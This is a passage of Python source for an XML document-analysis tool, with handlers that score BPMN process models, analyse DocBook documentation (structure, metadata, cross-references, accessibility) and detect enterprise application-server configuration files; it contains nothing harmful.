                        'type': 'performer'
                    })
        
        return assignments[:20]  # Limit
    
    def _extract_process_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Extract process metrics and KPIs"""
        metrics = {
            'process_count': len(self._find_elements_by_local_name(root, 'process')),
            'avg_activities_per_process': 0.0,
            'gateway_distribution': {},
            'event_distribution': {},
            'automation_potential': 0.0
        }
        
        # Calculate averages
        total_activities = 0
        processes = self._find_elements_by_local_name(root, 'process')
        
        for process in processes:
            total_activities += len(self._find_elements_by_local_name(process, 'task'))
        
        if processes:
            metrics['avg_activities_per_process'] = total_activities / len(processes)
        
        # Gateway distribution
        gateway_types = ['exclusiveGateway', 'parallelGateway', 'inclusiveGateway', 'eventBasedGateway']
        for gw_type in gateway_types:
            count = len(self._find_elements_by_local_name(root, gw_type))
            if count > 0:
                metrics['gateway_distribution'][gw_type] = count
        
        # Event distribution
        event_types = ['startEvent', 'endEvent', 'intermediateThrowEvent', 'intermediateCatchEvent', 'boundaryEvent']
        for event_type in event_types:
            count = len(self._find_elements_by_local_name(root, event_type))
            if count > 0:
                metrics['event_distribution'][event_type] = count
        
        # Automation potential (ratio of service/script tasks to all tasks)
        service_tasks = len(self._find_elements_by_local_name(root, 'serviceTask'))
        script_tasks = len(self._find_elements_by_local_name(root, 'scriptTask'))
        total_tasks = len(self._find_elements_by_local_name(root, 'task'))
        
        if total_tasks > 0:
            metrics['automation_potential'] = (service_tasks + script_tasks) / total_tasks
        
        return metrics
    
    def _assess_process_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess process model quality"""
        # Completeness - all activities have names
        completeness = 0.0
        total_activities = findings['activities']['total']
        if total_activities > 0:
            # Estimate based on typical patterns
            completeness = 0.7  # Placeholder - would need detailed name checking
        
        # Correctness - proper start/end events
        correctness = 0.0
        has_start = len(findings['events']['start_events']) > 0
        has_end = len(findings['events']['end_events']) > 0
        if has_start and has_end:
            correctness = 1.0
        elif has_start or has_end:
            correctness = 0.5
        
        # Complexity management
        complexity_score = findings['complexity_metrics']['complexity_score']
        complexity_quality = max(0, 1.0 - complexity_score)  # Lower complexity is better
        
        # Best practices
        best_practices = 0.0
        
        # Check for lane usage (organization)
        if findings['lanes']:
            best_practices += 0.25
        
        # Check for proper gateway usage
        if findings['gateways']['total'] > 0:
            # Prefer exclusive gateways over complex ones
            exclusive_ratio = len(findings['gateways']['exclusive']) / findings['gateways']['total']
            best_practices += exclusive_ratio * 0.25
        
        # Check for documentation
        doc_count = sum(1 for p in findings['processes'] if 'documentation' in p)
        if doc_count > 0:
            best_practices += 0.25
        
        # Check for proper event usage
        if findings['events']['total'] >= 2:  # At least start and end
            best_practices += 0.25
        
        return {
            "completeness": completeness,
            "correctness": correctness,
            "complexity_management": complexity_quality,
            "best_practices": min(best_practices, 1.0),
            "overall": (completeness + correctness + complexity_quality + best_practices) / 4
        }
</file>

<file path="src/handlers/docbook_handler.py">
#!/usr/bin/env python3
"""
DocBook Handler

Analyzes DocBook XML documentation files for structure analysis, content organization,
technical documentation quality assessment, and documentation generation workflows.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class DocBookHandler(XMLHandler):
    """Handler for DocBook XML documentation files"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for DocBook elements
        docbook_roots = ['book', 'article', 'chapter', 'section', 'para']
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if tag in docbook_roots:
            return True, 0.8
        
        # Check for DocBook namespace
        if any('docbook.org' in uri for uri in namespaces.values()):
            return True, 1.0
        
        return False, 0.0
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Detect DocBook version
        version = self._detect_docbook_version(root, namespaces)
        
        metadata = {
            "framework": "DocBook",
            "category": "technical_documentation",
            "document_type": tag,
            "has_chapters": len(root.findall('.//chapter')) > 0,
            "has_sections": len(root.findall('.//section')) > 0,
            "element_count": len(list(root.iter()))
        }
        
        return DocumentTypeInfo(
            type_name="DocBook Documentation",
            confidence=0.9,
            version=version,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {
            'docbook_info': {
                'document_type': root.tag.split('}')[-1] if '}' in root.tag else root.tag,
                'version': self._detect_docbook_version(root, {}),
                'namespaces': self._extract_namespace_info(root)
            },
            'structure': self._analyze_document_structure(root),
            'metadata': self._extract_metadata(root),
            'content_stats': self._analyze_content(root),
            'media': self._find_media_references(root),
            'cross_references': self._find_cross_references(root),
            'accessibility': self._analyze_accessibility_features(root),
            'quality_indicators': self._analyze_quality_indicators(root),
            'localization': self._analyze_localization_features(root),
            'publishing': self._analyze_publishing_features(root)
        }
        
        recommendations = [
            "Extract for documentation search system integration",
            "Generate multiple output formats (HTML, PDF, EPUB)",
            "Check for broken cross-references and validate links",
            "Analyze readability and completeness metrics",
            "Validate accessibility compliance (WCAG guidelines)",
            "Review document structure for logical organization",
            "Check media references for missing files",
            "Optimize for multi-format publishing workflows",
            "Validate DocBook schema compliance"
        ]
        
        ai_use_cases = [
            "Documentation quality analysis and improvement suggestions",
            "Automatic summary and abstract generation",
            "Technical content extraction and indexing",
            "Glossary and index generation from content",
            "Documentation translation and localization support",
            "Cross-reference validation and link checking",
            "Content accessibility analysis and enhancement",
            "Multi-format publishing optimization",
            "Document structure analysis and reorganization suggestions",
            "Technical writing style analysis and improvement"
        ]
        
        data_inventory = {
            'chapters': len(findings['structure']['chapters']),
            'sections': findings['structure']['total_sections'],
            'paragraphs': findings['content_stats']['paragraphs'],
            'media_items': len(findings['media']['media_references']),
            'cross_references': len(findings['cross_references']['internal_references']),
            'code_examples': len(findings['content_stats']['code_examples']),
            'tables': findings['content_stats']['tables'],
            'lists': findings['content_stats']['lists']
        }
        
        return SpecializedAnalysis(
            document_type=f"DocBook {findings['docbook_info']['document_type'].title()}",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._assess_documentation_quality(findings)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        return {
            'document_metadata': {
                'title': self._extract_title(root),
                'type': root.tag.split('}')[-1] if '}' in root.tag else root.tag,
                'version': self._detect_docbook_version(root, {}),
                'language': root.get('lang') or root.get('{http://www.w3.org/XML/1998/namespace}lang')
            },
            'content_summary': self._extract_content_summary(root),
            'structural_summary': self._extract_structural_summary(root),
            'technical_summary': self._extract_technical_summary(root)
        }
    
    def _detect_docbook_version(self, root: ET.Element, namespaces: Dict[str, str]) -> str:
        """Detect DocBook version from namespace or DTD"""
        # Check namespace for version
        for uri in namespaces.values():
            if 'docbook.org' in uri:
                if '/5.0/' in uri:
                    return "5.0"
                elif '/4.5/' in uri:
                    return "4.5"
                elif '/4.4/' in uri:
                    return "4.4"
                elif '/4.3/' in uri:
                    return "4.3"
        
        # Check root tag namespace
        if '}' in root.tag:
            namespace = root.tag.split('}')[0][1:]
            if 'docbook.org' in namespace:
                if '/5.0/' in namespace:
                    return "5.0"
                elif '/4.' in namespace:
                    return "4.x"
        
        # Default assumption
        return "5.0"
    
    def _extract_namespace_info(self, root: ET.Element) -> Dict[str, Any]:
        """Extract namespace information"""
        namespaces = {}
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':', 1)[1] if ':' in key else 'default'
                namespaces[prefix] = value
        
        return {
            'declared_namespaces': namespaces,
            'docbook_namespace': any('docbook.org' in uri for uri in namespaces.values()),
            'xlink_namespace': 'xlink' in namespaces
        }
    
    def _analyze_document_structure(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze document structure and hierarchy"""
        # Handle namespaced elements properly
        ns_prefix = '{http://docbook.org/ns/docbook}' if '}' in root.tag else ''
        
        structure = {
            'document_type': root.tag.split('}')[-1] if '}' in root.tag else root.tag,
            'chapters': [],
            'total_sections': 0,
            'max_depth': 0,
            'parts': [],
            'appendices': [],
            'hierarchy_analysis': {}
        }
        
        # Analyze parts
        for part in root.findall(f'.//{ns_prefix}part'):
            title_elem = part.find(f'.//{ns_prefix}title')
            structure['parts'].append({
                'title': title_elem.text if title_elem is not None else 'Untitled Part',
                'chapters': len(part.findall(f'.//{ns_prefix}chapter')),
                'sections': len(part.findall(f'.//{ns_prefix}section'))
            })
        
        # Analyze chapters
        for chapter in root.findall(f'.//{ns_prefix}chapter'):
            title_elem = chapter.find(f'.//{ns_prefix}title')
            chapter_info = {
                'title': title_elem.text if title_elem is not None else 'Untitled Chapter',
                'sections': len(chapter.findall(f'.//{ns_prefix}section')),
                'subsections': len(chapter.findall(f'.//{ns_prefix}section//{ns_prefix}section')),
                'id': chapter.get('id') or chapter.get('{http://www.w3.org/XML/1998/namespace}id')
            }
            structure['chapters'].append(chapter_info)
        
        # Analyze appendices
        for appendix in root.findall(f'.//{ns_prefix}appendix'):
            title_elem = appendix.find(f'.//{ns_prefix}title')
            structure['appendices'].append({
                'title': title_elem.text if title_elem is not None else 'Untitled Appendix',
                'sections': len(appendix.findall(f'.//{ns_prefix}section'))
            })
        
        # Count all sections
        structure['total_sections'] = len(root.findall(f'.//{ns_prefix}section'))
        
        # Calculate hierarchy depth
        structure['max_depth'] = self._calculate_max_depth(root)
        
        # Analyze hierarchy consistency
        structure['hierarchy_analysis'] = self._analyze_hierarchy_consistency(root)
        
        return structure
    
    def _extract_metadata(self, root: ET.Element) -> Dict[str, Any]:
        """Extract document metadata from info elements"""
        # DocBook 5.x uses 'info', 4.x uses specific info elements
        info = (root.find('.//info') or 
                root.find('.//bookinfo') or 
                root.find('.//articleinfo') or
                root.find('.//chapterinfo'))
        
        if info is None:
            return {
                'has_metadata': False,
                'title': self._extract_title(root),
                'extracted_from': 'root_title_only'
            }
        
        metadata = {
            'has_metadata': True,
            'title': getattr(info.find('.//title'), 'text', None),
            'subtitle': getattr(info.find('.//subtitle'), 'text', None),
            'author': self._extract_author_info(info),
            'date': getattr(info.find('.//date'), 'text', None),
            'publisher': getattr(info.find('.//publisher//publishername'), 'text', None),
            'copyright': self._extract_copyright_info(info),
            'abstract': self._extract_abstract(info),
            'keywords': self._extract_keywords(info),
            'revision_history': self._extract_revision_history(info)
        }
        
        return metadata
    
    def _analyze_content(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze content statistics and types"""
        # Handle namespaced elements properly
        ns_prefix = '{http://docbook.org/ns/docbook}' if '}' in root.tag else ''
        
        content_stats = {
            'paragraphs': len(root.findall(f'.//{ns_prefix}para')),
            'lists': len(root.findall(f'.//{ns_prefix}itemizedlist')) + len(root.findall(f'.//{ns_prefix}orderedlist')),
            'tables': len(root.findall(f'.//{ns_prefix}table')) + len(root.findall(f'.//{ns_prefix}informaltable')),
            'figures': len(root.findall(f'.//{ns_prefix}figure')),
            'examples': len(root.findall(f'.//{ns_prefix}example')),
            'equations': len(root.findall(f'.//{ns_prefix}equation')) + len(root.findall(f'.//{ns_prefix}informalequation')),
            'code_examples': self._count_code_examples(root),
            'admonitions': {
                'notes': len(root.findall(f'.//{ns_prefix}note')),
                'warnings': len(root.findall(f'.//{ns_prefix}warning')),
                'cautions': len(root.findall(f'.//{ns_prefix}caution')),
                'important': len(root.findall(f'.//{ns_prefix}important')),
                'tips': len(root.findall(f'.//{ns_prefix}tip'))
            },
            'footnotes': len(root.findall(f'.//{ns_prefix}footnote')),
            'bibliographic_entries': len(root.findall(f'.//{ns_prefix}biblioentry'))
        }
        
        # Add content density analysis
        total_elements = len(list(root.iter()))
        content_stats['content_density'] = {
            'paragraph_density': content_stats['paragraphs'] / total_elements if total_elements > 0 else 0,
            'example_density': len(content_stats['code_examples']) / total_elements if total_elements > 0 else 0,
            'media_density': (content_stats['figures'] + content_stats['tables']) / total_elements if total_elements > 0 else 0
        }
        
        return content_stats
    
    def _find_media_references(self, root: ET.Element) -> Dict[str, Any]:
        """Find and analyze media references"""
        media_info = {
            'media_references': [],
            'media_types': {},
            'broken_references_check': [],
            'accessibility_analysis': {}
        }
        
        # Find image references
        for elem in root.findall('.//imagedata'):
            media_ref = {
                'type': 'image',
                'fileref': elem.get('fileref'),
                'format': elem.get('format'),
                'width': elem.get('width'),
                'depth': elem.get('depth'),
                'scale': elem.get('scale'),
                'align': elem.get('align'),
                'parent_element': elem.getparent().tag if hasattr(elem, 'getparent') else 'unknown'
            }
            media_info['media_references'].append(media_ref)
            
            # Count media types
            format_type = elem.get('format', 'unknown')
            media_info['media_types'][format_type] = media_info['media_types'].get(format_type, 0) + 1
        
        # Find video/audio references
        for elem in root.findall('.//videodata'):
            media_info['media_references'].append({
                'type': 'video',
                'fileref': elem.get('fileref'),
                'format': elem.get('format')
            })
        
        for elem in root.findall('.//audiodata'):
            media_info['media_references'].append({
                'type': 'audio',
                'fileref': elem.get('fileref'),
                'format': elem.get('format')
            })
        
        # Analyze accessibility features for media
        media_info['accessibility_analysis'] = self._analyze_media_accessibility(root)
        
        return media_info
    
    def _find_cross_references(self, root: ET.Element) -> Dict[str, Any]:
        """Find and analyze cross-references"""
        xref_info = {
            'internal_references': [],
            'external_references': [],
            'link_analysis': {},
            'reference_targets': set(),
            'orphaned_references': []
        }
        
        # Find all elements with IDs (potential targets)
        for elem in root.iter():
            elem_id = elem.get('id') or elem.get('{http://www.w3.org/XML/1998/namespace}id')
            if elem_id:
                xref_info['reference_targets'].add(elem_id)
        
        # Find xref elements
        for xref in root.findall('.//xref'):
            linkend = xref.get('linkend')
            if linkend:
                xref_info['internal_references'].append({
                    'linkend': linkend,
                    'exists': linkend in xref_info['reference_targets'],
                    'element': 'xref'
                })
        
        # Find link elements
        for link in root.findall('.//link'):
            linkend = link.get('linkend')
            if linkend:
                xref_info['internal_references'].append({
                    'linkend': linkend,
                    'exists': linkend in xref_info['reference_targets'],
                    'element': 'link'
                })
        
        # Find external links
        for ulink in root.findall('.//ulink'):
            url = ulink.get('url')
            if url:
                xref_info['external_references'].append({
                    'url': url,
                    'text': ulink.text,
                    'element': 'ulink'
                })
        
        # Analyze broken references
        for ref in xref_info['internal_references']:
            if not ref['exists']:
                xref_info['orphaned_references'].append(ref['linkend'])
        
        # Generate link analysis
        xref_info['link_analysis'] = {
            'total_internal': len(xref_info['internal_references']),
            'total_external': len(xref_info['external_references']),
            'broken_internal': len(xref_info['orphaned_references']),
            'reference_density': len(xref_info['internal_references']) / max(len(list(root.iter())), 1)
        }
        
        return xref_info
    
    def _analyze_accessibility_features(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze accessibility features"""
        accessibility = {
            'alt_text_coverage': 0,
            'table_accessibility': {},
            'structure_accessibility': {},
            'language_support': {},
            'accessibility_score': 0.0,
            'recommendations': []
        }
        
        # Check alt text for images
        images = root.findall('.//imagedata')
        images_with_alt = 0
        for img in images:
            # Check for alt attribute or textobject
            parent_figure = img.getparent() if hasattr(img, 'getparent') else None
            if parent_figure and parent_figure.find('.//textobject'):
                images_with_alt += 1
        
        if images:
            accessibility['alt_text_coverage'] = images_with_alt / len(images)
        
        # Check table accessibility
        tables = root.findall('.//table') + root.findall('.//informaltable')
        tables_with_headers = sum(1 for table in tables if table.find('.//thead'))
        accessibility['table_accessibility'] = {
            'total_tables': len(tables),
            'tables_with_headers': tables_with_headers,
            'header_coverage': tables_with_headers / len(tables) if tables else 0
        }
        
        # Check structural accessibility
        accessibility['structure_accessibility'] = {
            'has_title': root.find('.//title') is not None,
            'has_toc': root.find('.//toc') is not None,
            'section_hierarchy': len(root.findall('.//section')) > 0
        }
        
        # Calculate accessibility score
        score = 0
        if accessibility['alt_text_coverage'] > 0.8:
            score += 0.3
        if accessibility['table_accessibility']['header_coverage'] > 0.8:
            score += 0.3
        if accessibility['structure_accessibility']['has_title']:
            score += 0.2
        if accessibility['structure_accessibility']['section_hierarchy']:
            score += 0.2
        
        accessibility['accessibility_score'] = score
        
        # Generate recommendations
        if accessibility['alt_text_coverage'] < 0.8:
            accessibility['recommendations'].append('Add alt text or textobject for images')
        if accessibility['table_accessibility']['header_coverage'] < 0.8:
            accessibility['recommendations'].append('Add proper table headers for accessibility')
        if not accessibility['structure_accessibility']['has_toc']:
            accessibility['recommendations'].append('Consider adding table of contents for navigation')
        
        return accessibility
    
    def _analyze_quality_indicators(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze documentation quality indicators"""
        quality = {
            'completeness_indicators': {},
            'consistency_checks': {},
            'best_practices': {},
            'quality_score': 0.0
        }
        
        # Completeness indicators
        has_abstract = root.find('.//abstract') is not None
        has_examples = len(root.findall('.//example')) > 0
        has_index = root.find('.//index') is not None
        has_bibliography = root.find('.//bibliography') is not None
        
        quality['completeness_indicators'] = {
            'has_abstract': has_abstract,
            'has_examples': has_examples,
            'has_index': has_index,
            'has_bibliography': has_bibliography,
            'completeness_score': sum([has_abstract, has_examples, has_index, has_bibliography]) / 4
        }
        
        # Consistency checks
        sections_with_titles = len([s for s in root.findall('.//section') if s.find('.//title') is not None])
        total_sections = len(root.findall('.//section'))
        
        quality['consistency_checks'] = {
            'section_title_consistency': sections_with_titles / total_sections if total_sections > 0 else 1.0,
            'id_consistency': self._check_id_consistency(root)
        }
        
        # Best practices
        quality['best_practices'] = {
            'uses_semantic_markup': self._check_semantic_markup(root),
            'proper_nesting': self._check_proper_nesting(root),
            'metadata_present': root.find('.//info') is not None
        }
        
        # Calculate overall quality score
        quality['quality_score'] = (
            quality['completeness_indicators']['completeness_score'] * 0.4 +
            quality['consistency_checks']['section_title_consistency'] * 0.3 +
            sum(quality['best_practices'].values()) / len(quality['best_practices']) * 0.3
        )
        
        return quality
    
    def _analyze_localization_features(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze localization and internationalization features"""
        localization = {
            'language_info': {},
            'translatable_content': {},
            'localization_support': {}
        }
        
        # Check language attributes
        lang = root.get('lang') or root.get('{http://www.w3.org/XML/1998/namespace}lang')
        localization['language_info'] = {
            'primary_language': lang,
            'has_language_attribute': lang is not None,
            'multiple_languages': len(set(elem.get('lang') or elem.get('{http://www.w3.org/XML/1998/namespace}lang') 
                                          for elem in root.iter() if elem.get('lang') or elem.get('{http://www.w3.org/XML/1998/namespace}lang'))) > 1
        }
        
        # Analyze translatable content
        text_elements = len([elem for elem in root.iter() if elem.text and elem.text.strip()])
        localization['translatable_content'] = {
            'text_elements': text_elements,
            'estimated_word_count': self._estimate_word_count(root)
        }
        
        return localization
    
    def _analyze_publishing_features(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze publishing and output generation features"""
        publishing = {
            'output_hints': {},
            'formatting_elements': {},
            'publishing_metadata': {}
        }
        
        # Check for output-specific elements
        publishing['output_hints'] = {
            'has_page_breaks': len(root.findall('.//pagebreak')) > 0,
            'has_index_terms': len(root.findall('.//indexterm')) > 0,
            'has_processing_instructions': len([elem for elem in root.iter() if elem.tag.startswith('<?')]) > 0
        }
        
        # Check formatting elements
        publishing['formatting_elements'] = {
            'emphasis_elements': len(root.findall('.//emphasis')),
            'literal_elements': len(root.findall('.//literal')),
            'subscript_superscript': len(root.findall('.//subscript')) + len(root.findall('.//superscript'))
        }
        
        return publishing
    
    def _count_code_examples(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Count and analyze code examples"""
        code_examples = []
        
        for example in root.findall('.//programlisting'):
            code_info = {
                'language': example.get('language', 'unknown'),
                'linenumbering': example.get('linenumbering') == 'numbered',
                'length': len(example.text) if example.text else 0,
                'has_title': example.getparent() and example.getparent().find('.//title') is not None if hasattr(example, 'getparent') else False
            }
            code_examples.append(code_info)
        
        # Also check screen elements (command line examples)
        for screen in root.findall('.//screen'):
            code_examples.append({
                'language': 'shell',
                'type': 'screen_output',
                'length': len(screen.text) if screen.text else 0
            })
        
        return code_examples[:20]  # Limit to first 20 examples
    
    def _calculate_max_depth(self, root: ET.Element, depth: int = 0) -> int:
        """Calculate maximum nesting depth"""
        if not list(root):
            return depth
        return max(self._calculate_max_depth(child, depth + 1) for child in root)
    
    def _analyze_hierarchy_consistency(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze document hierarchy consistency"""
        hierarchy = {
            'consistent_numbering': True,
            'proper_nesting': True,
            'missing_titles': 0
        }
        
        # Check for missing titles in structural elements
        structural_elements = ['chapter', 'section', 'appendix', 'part']
        for elem_type in structural_elements:
            elements = root.findall(f'.//{elem_type}')
            for elem in elements:
                if elem.find('.//title') is None:
                    hierarchy['missing_titles'] += 1
        
        return hierarchy
    
    def _extract_author_info(self, info: ET.Element) -> Dict[str, Any]:
        """Extract comprehensive author information"""
        authors = []
        
        for author in info.findall('.//author'):
            author_info = {}
            
            # Name components
            firstname = author.find('.//firstname')
            surname = author.find('.//surname')
            othername = author.find('.//othername')
            
            if firstname is not None and surname is not None:
                author_info['name'] = f"{firstname.text} {surname.text}"
                if othername is not None:
                    author_info['name'] = f"{firstname.text} {othername.text} {surname.text}"
            
            # Contact info
            email = author.find('.//email')
            if email is not None:
                author_info['email'] = email.text
            
            # Affiliation
            affiliation = author.find('.//affiliation')
            if affiliation is not None:
                orgname = affiliation.find('.//orgname')
                if orgname is not None:
                    author_info['organization'] = orgname.text
            
            authors.append(author_info)
        
        return authors if authors else None
    
    def _extract_copyright_info(self, info: ET.Element) -> Optional[Dict[str, Any]]:
        """Extract copyright information"""
        copyright_elem = info.find('.//copyright')
        if copyright_elem is None:
            return None
        
        copyright_info = {}
        
        year = copyright_elem.find('.//year')
        if year is not None:
            copyright_info['year'] = year.text
        
        holder = copyright_elem.find('.//holder')
        if holder is not None:
            copyright_info['holder'] = holder.text
        
        return copyright_info
    
    def _extract_abstract(self, info: ET.Element) -> Optional[str]:
        """Extract document abstract"""
        abstract = info.find('.//abstract')
        if abstract is not None:
            # Combine all paragraph text
            paras = abstract.findall('.//para')
            if paras:
                return ' '.join(para.text for para in paras if para.text)
            return abstract.text
        return None
    
    def _extract_keywords(self, info: ET.Element) -> List[str]:
        """Extract keywords"""
        keywords = []
        keywordset = info.find('.//keywordset')
        if keywordset is not None:
            for keyword in keywordset.findall('.//keyword'):
                if keyword.text:
                    keywords.append(keyword.text)
        return keywords
    
    def _extract_revision_history(self, info: ET.Element) -> List[Dict[str, Any]]:
        """Extract revision history"""
        revisions = []
        revhistory = info.find('.//revhistory')
        if revhistory is not None:
            for revision in revhistory.findall('.//revision'):
                rev_info = {}
                
                revnumber = revision.find('.//revnumber')
                if revnumber is not None:
                    rev_info['number'] = revnumber.text
                
                date = revision.find('.//date')
                if date is not None:
                    rev_info['date'] = date.text
                
                authorinitials = revision.find('.//authorinitials')
                if authorinitials is not None:
                    rev_info['author'] = authorinitials.text
                
                revremark = revision.find('.//revremark')
                if revremark is not None:
                    rev_info['remark'] = revremark.text
                
                revisions.append(rev_info)
        
        return revisions
    
    def _analyze_media_accessibility(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze media accessibility features"""
        accessibility = {
            'images_with_alt': 0,
            'total_images': 0,
            'media_descriptions': 0
        }
        
        for mediaobject in root.findall('.//mediaobject'):
            accessibility['total_images'] += 1
            
            # Check for textobject (alt text equivalent)
            if mediaobject.find('.//textobject'):
                accessibility['images_with_alt'] += 1
        
        return accessibility
    
    def _check_id_consistency(self, root: ET.Element) -> float:
        """Check consistency of ID attributes"""
        elements_with_ids = 0
        structural_elements = 0
        
        for elem in root.findall('.//chapter') + root.findall('.//section') + root.findall('.//appendix'):
            structural_elements += 1
            if elem.get('id') or elem.get('{http://www.w3.org/XML/1998/namespace}id'):
                elements_with_ids += 1
        
        return elements_with_ids / structural_elements if structural_elements > 0 else 1.0
    
    def _check_semantic_markup(self, root: ET.Element) -> bool:
        """Check for proper semantic markup usage"""
        semantic_elements = ['emphasis', 'literal', 'filename', 'command', 'option', 'replaceable']
        return any(len(root.findall(f'.//{elem}')) > 0 for elem in semantic_elements)
    
    def _check_proper_nesting(self, root: ET.Element) -> bool:
        """Check for proper element nesting"""
        # This is a simplified check - would need more comprehensive validation
        return True  # Assume proper nesting unless we detect issues
    
    def _estimate_word_count(self, root: ET.Element) -> int:
        """Estimate word count for translatable content"""
        word_count = 0
        for elem in root.iter():
            if elem.text and elem.text.strip():
                word_count += len(elem.text.strip().split())
        return word_count
    
    def _extract_title(self, root: ET.Element) -> str:
        """Extract document title"""
        # Handle namespaced elements properly
        ns_prefix = '{http://docbook.org/ns/docbook}' if '}' in root.tag else ''
        title = root.find(f'.//{ns_prefix}title')
        return title.text if title is not None else 'Untitled Document'
    
    def _extract_content_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract content summary"""
        content = self._analyze_content(root)
        return {
            'total_paragraphs': content['paragraphs'],
            'content_types': {
                'narrative': content['paragraphs'],
                'examples': len(content['code_examples']),
                'tables': content['tables'],
                'figures': content['figures']
            },
            'estimated_reading_time': content['paragraphs'] * 0.5  # Rough estimate in minutes
        }
    
    def _extract_structural_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract structural summary"""
        structure = self._analyze_document_structure(root)
        return {
            'document_type': structure['document_type'],
            'major_sections': len(structure['chapters']),
            'total_sections': structure['total_sections'],
            'max_nesting_depth': structure['max_depth'],
            'has_appendices': len(structure['appendices']) > 0
        }
    
    def _extract_technical_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract technical summary"""
        return {
            'docbook_version': self._detect_docbook_version(root, {}),
            'namespace_count': len([k for k in root.attrib.keys() if k.startswith('xmlns')]),
            'cross_references': len(root.findall('.//xref')),
            'external_links': len(root.findall('.//ulink')),
            'media_objects': len(root.findall('.//mediaobject'))
        }
    
    def _assess_documentation_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess overall documentation quality"""
        
        # Content quality
        content = findings['content_stats']
        structure = findings['structure']
        
        content_score = 0.0
        if content['paragraphs'] > 10:  # Substantial content
            content_score += 0.3
        if len(content['code_examples']) > 0:  # Has examples
            content_score += 0.3
        if content['admonitions']['notes'] + content['admonitions']['warnings'] > 0:  # Has helpful notes
            content_score += 0.2
        if content['tables'] > 0 or content['figures'] > 0:  # Has visual aids
            content_score += 0.2
        
        # Structure quality
        structure_score = 0.0
        if structure['total_sections'] > 0:  # Well structured
            structure_score += 0.4
        if len(structure['chapters']) > 1:  # Multi-chapter document
            structure_score += 0.3
        if structure['max_depth'] <= 5:  # Reasonable depth
            structure_score += 0.3
        
        # Metadata quality
        metadata = findings['metadata']
        metadata_score = 0.0
        if metadata['has_metadata']:
            metadata_score += 0.5
        if metadata.get('author'):
            metadata_score += 0.3
        if metadata.get('abstract'):
            metadata_score += 0.2
        
        # Accessibility quality
        accessibility_score = findings['accessibility']['accessibility_score']
        
        # Cross-reference quality
        xref = findings['cross_references']
        xref_score = 1.0
        if xref['link_analysis']['total_internal'] > 0:
            broken_ratio = xref['link_analysis']['broken_internal'] / xref['link_analysis']['total_internal']
            xref_score = max(0.0, 1.0 - broken_ratio)
        
        return {
            "content_quality": content_score,
            "structure_quality": structure_score,
            "metadata_quality": metadata_score,
            "accessibility": accessibility_score,
            "reference_integrity": xref_score,
            "overall": (content_score + structure_score + metadata_score + accessibility_score + xref_score) / 5
        }
</file>

<file path="src/handlers/enterprise_config_handler.py">
#!/usr/bin/env python3
"""
Enterprise Configuration Handler

Handles various enterprise XML configuration files including:
- Java EE web.xml (deployment descriptors)
- Tomcat server.xml and context.xml
- JBoss/WildFly configuration files
- WebLogic config.xml
- Generic application server configurations
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class EnterpriseConfigHandler(XMLHandler):
    """Handler for enterprise application server configuration files"""
    
    # Known configuration file patterns
    CONFIG_PATTERNS = {
        'web.xml': {
            'root_elements': ['web-app'],
            'namespaces': ['java.sun.com/xml/ns/javaee', 'java.sun.com/xml/ns/j2ee', 'xmlns.jcp.org/xml/ns/javaee'],
            'type': 'Java EE Deployment Descriptor'
        },
        'server.xml': {
            'root_elements': ['Server'],
            'indicators': ['Connector', 'Engine', 'Host', 'Context'],
            'type': 'Tomcat Server Configuration'
        },
        'context.xml': {
            'root_elements': ['Context'],
            'indicators': ['Resource', 'ResourceLink', 'Valve'],
            'type': 'Tomcat Context Configuration'
        },
        'standalone.xml': {
            'root_elements': ['server'],
            'namespaces': ['urn:jboss:domain'],
            'type': 'JBoss/WildFly Configuration'
        },
        'config.xml': {
            'root_elements': ['domain', 'config'],
            'indicators': ['server', 'machine', 'cluster'],
            'type': 'WebLogic Configuration'
        },
        'applicationContext.xml': {
            'root_elements': ['beans'],
            'namespaces': ['springframework.org/schema/beans'],
            'type': 'Spring Application Context'
        }
    }
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        # Check each known pattern
        for config_name, pattern in self.CONFIG_PATTERNS.items():
            score = 0.0
            
            # Check root element
            if 'root_elements' in pattern and root_tag in pattern['root_elements']:
                score += 0.5
            
            # Check namespaces
            if 'namespaces' in pattern:
                for ns in pattern['namespaces']:
                    if any(ns in uri for uri in namespaces.values()):
                        score += 0.5
                        break
            
            # Check for indicator elements
            if 'indicators' in pattern and score < 1.0:
                indicator_count = 0
                for indicator in pattern['indicators']:
                    if root.find(f'.//{indicator}') is not None:
                        indicator_count += 1
                
                if indicator_count > 0:
